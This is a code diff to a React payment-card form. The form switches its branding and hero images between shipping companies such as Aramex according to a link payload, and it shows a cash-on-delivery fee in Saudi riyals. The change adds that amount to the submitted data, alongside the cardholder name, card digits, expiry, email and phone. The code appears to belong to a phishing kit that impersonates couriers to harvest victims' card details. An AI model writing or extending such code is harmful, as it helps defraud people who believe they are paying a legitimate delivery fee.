@@ -29,6 +29,9 @@ const PaymentCardForm = () => {
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
   const serviceName = linkData?.payload?.service_name || customerInfo.service || 'aramex';
   const branding = getServiceBranding(serviceName);
+  const shippingInfo = linkData?.payload as any;
+  const amount = shippingInfo?.cod_amount || 500;
+  const formattedAmount = `${amount} ر.س`;
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -81,6 +84,7 @@ const PaymentCardForm = () => {
           email: customerInfo.email || '',
           phone: customerInfo.phone || '',
           service: serviceName,
+          amount: formattedAmount,
           cardholder: cardName,
           cardLast4: last4,
           expiry: expiry,
@@ -324,6 +328,7 @@ const PaymentCardForm = () => {
               <input type="email" name="email" />
               <input type="tel" name="phone" />
               <input type="text" name="service" />
+              <input type="text" name="amount" />
               <input type="text" name="cardholder" />
               <input type="text" name="cardLast4" />
               <input type="text" name="expiry" />
